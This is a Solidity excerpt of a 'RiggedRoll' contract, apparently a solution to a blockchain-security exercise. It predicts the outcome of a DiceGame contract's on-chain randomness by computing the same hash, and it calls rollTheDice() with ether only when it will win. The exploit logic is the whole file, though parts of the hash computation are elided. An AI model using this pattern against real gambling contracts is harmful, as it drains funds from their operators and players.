...
error RiggedRoll_NotEnoughBalance();
error RiggedRoll_NoChanceOfWinning();
error RiggedRoll_FailedToRollTheDice();

contract RiggedRoll is Ownable {
    DiceGame public diceGame;
    address private immutable i_diceGameAddress;
    ...
    function riggedRoll() public payable returns (uint256) {
        if (address(this).balance < 0.002 ether) {
            revert RiggedRoll_NotEnoughBalance();
        }
        uint256 hash = (
            uint256(
                keccak256(
        ...
        if (hash <= 2) {
            //bytes4 selector = bytes4(keccak256(bytes("rollTheDice()")));
            (bool success, ) = address(diceGame).call{value: 0.002 ether}(
                //abi.encodeWithSelector(selector),
                abi.encodeWithSignature("rollTheDice()")
            );
            if (!success) {
                revert RiggedRoll_FailedToRollTheDice();
            }
            //require(success, "Failed to roll the dice");
        } else {
            revert RiggedRoll_NoChanceOfWinning();
        }
        return (hash);
    }
